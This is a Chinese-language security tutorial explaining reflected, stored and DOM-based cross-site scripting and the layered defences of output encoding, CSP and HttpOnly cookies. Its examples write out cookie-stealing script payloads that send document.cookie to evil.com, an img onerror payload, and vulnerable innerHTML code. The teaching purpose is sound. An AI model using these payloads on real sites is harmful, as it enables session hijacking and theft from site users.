---
title: 跨站脚本攻击（XSS）：反射型、存储型与 DOM 型
date: 2026-08-07
---

# 跨站脚本攻击（XSS）：反射型、存储型与 DOM 型

<div class="epigraph">
<p>XSS 是「注入家族」在浏览器里的化身——攻击者不入侵服务器，而是让受害者的浏览器替自己执行代码。</p>
<footer>—— OWASP（XSS 防护速查）</footer>
</div>

<div class="article-byline">
<p>第三级 · 密码学与信息安全 ｜ Stallings《密码编码学与网络安全》第二十六章 ｜ 2026-08-07</p>
</div>

## 为什么从 XSS 开始

上一节的 SQL 注入打服务器，而 **XSS（Cross-Site Scripting，跨站脚本）** 打的是**用户的浏览器**：攻击者把恶意脚本注入网页，受害者的浏览器在「可信站点」的上下文里执行它。XSS 是 Web 安全最普遍的漏洞之一，能偷 Cookie、劫持会话、篡改页面、甚至把用户变成攻击者的跳板。理解 XSS 的三种形态（反射型、存储型、DOM 型），是 Web 安全的必修课。<span class="marginnote">一个认知锚点：<strong>XSS 的本质是「不可信数据被渲染成 HTML/JS 并执行」</strong>——与 SQL 注入的「数据当代码」完全同构，只是目标从数据库换成了浏览器。浏览器信任「来自可信站点的脚本」，攻击者利用这个信任在页面里塞进自己的脚本。</span>

## 1 反射型 XSS：输入「弹回来」就执行

**反射型（reflected）XSS**：恶意脚本在**请求里**，服务器把它「反射」回响应页面。

经典场景（搜索框）：

1. 受害者点击恶意链接：`https://example.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>`
2. 服务器把 `q` 的值**原样**拼进页面：`<p>您搜索了：<script>...</script></p>`
3. 浏览器执行了 `<script>`——把 Cookie 发给攻击者。

**特征**：注入代码不持久，**一次请求一次执行**——需要「诱导受害者点击恶意链接」（钓鱼、发链接）。

**危害**：会话劫持（偷 Cookie）、钓鱼、冒充用户操作。

## 2 存储型 XSS：代码住进数据库

**存储型（stored）XSS**：恶意脚本**被服务器存储**（评论、发帖、用户名），任何访问该页面的用户都会触发。

经典场景（评论区）：

1. 攻击者在评论框提交：`<script>document.location='https://evil.com?c='+document.cookie</script>`
2. 服务器把评论存进数据库。
3. **每个访问该页面的用户**，浏览器都执行这段脚本——攻击者批量收割 Cookie。

**特征**：**持久、被动触发、影响所有访问者**——比反射型危害大得多。论坛、CMS、评论区是重灾区。

**危害**：批量会话劫持、蠕虫式传播（脚本自动发帖）、全站用户沦陷。

## 3 DOM 型 XSS：代码在浏览器里「就地取材」

**DOM 型（DOM-based）XSS**：恶意脚本不进服务器响应，而是**在浏览器端的 JavaScript 里**被构造执行。

经典场景（前端路由/查询参数）：

```js
let name = new URLSearchParams(location.search).get('name');
document.getElementById('greet').innerHTML = '你好，' + name;   // 危险！
```

如果 `name` 是 `<img src=x onerror=alert(1)>`，`innerHTML` 把它当 HTML 渲染——`onerror` 触发脚本。

**特征**：**服务器完全不知情**（攻击发生在客户端 DOM 操作），传统 WAF/服务端过滤看不见它。检测更难、防御要改前端代码。<span class="marginnote">DOM XSS 是三种里「最现代、最难防」的：<strong>它绕过了服务器（请求与响应都正常），问题全在浏览器里的 `innerHTML`、`eval`、`document.write` 等「把数据当代码」的 API</strong>。防御不能靠服务端，必须在前端「把输出编码 + 用安全 API（textContent 而非 innerHTML）」。</span>

## 4 公式解析：XSS 的统一成因

$$
\text{不可信数据} + \text{浏览器渲染为可执行上下文（HTML/JS）} \Rightarrow \text{脚本执行}
$$

三步拆解这条「XSS 通用公式」：

- **第一步，数据来源**：用户输入、URL 参数、数据库内容、第三方 API——都可能是不可信的。
- **第二步，渲染路径**：`innerHTML`、`document.write`、`eval`、模板字符串拼接——把数据「当代码」插入。
- **第三步，执行上下文**：浏览器在页面源（可信域）上下文执行脚本——**脚本拥有该域的全部权限（Cookie、localStorage、DOM）**。

## 5 防御 XSS：输出编码 + CSP

XSS 防御的核心是**「永远把不可信数据当数据，不当代码」**：

- **输出编码（Output Encoding）**：根据渲染上下文编码——HTML 实体编码、JS 字符串转义、URL 编码、属性编码。框架（React 默认转义、Django 自动转义）已内置。
- **CSP（Content Security Policy）**：HTTP 响应头声明「哪些脚本可信」——`default-src 'self'` 禁止内联脚本，即使注入成功也不执行。
- **HttpOnly Cookie**：`HttpOnly` 标记的 Cookie **JavaScript 读不到**——偷 Cookie 的 XSS 失效（但防不了其他利用）。
- **输入验证**：白名单校验（纵深防御补充，不是主防线）。
- **安全 API**：`textContent` 而非 `innerHTML`、不用 `eval`。

**分层**：输出编码是「根治」（正确编码就让注入无法成为代码），CSP 是「兜底」（编码漏了也拦截执行），HttpOnly 是「减损」（即使执行也偷不到 Cookie）。<span class="marginnote">CSP 是 XSS 防御的「第二层铠甲」：<strong>即使输出编码漏了、脚本被注入了，CSP 也会阻止浏览器执行它</strong>——「允许执行的脚本白名单」把攻击脚本挡在门外。现代 Web 应用的标配是「输出编码 + CSP + HttpOnly」三层叠加。</span>

## 6 小结

- **反射型**：恶意代码在请求里，服务器反射执行——需诱导点击。
- **存储型**：代码存进数据库，所有访问者触发——持久、危害大。
- **DOM 型**：代码在前端 JS 里构造执行——服务器看不见，最难防。
- **统一成因**：不可信数据被渲染成可执行上下文。
- **防御**：输出编码（根治）+ CSP（兜底）+ HttpOnly Cookie（减损）+ 安全 API。

在下一节，我们看 XSS 的「兄弟」攻击——**跨站请求伪造（CSRF）及其防护**。
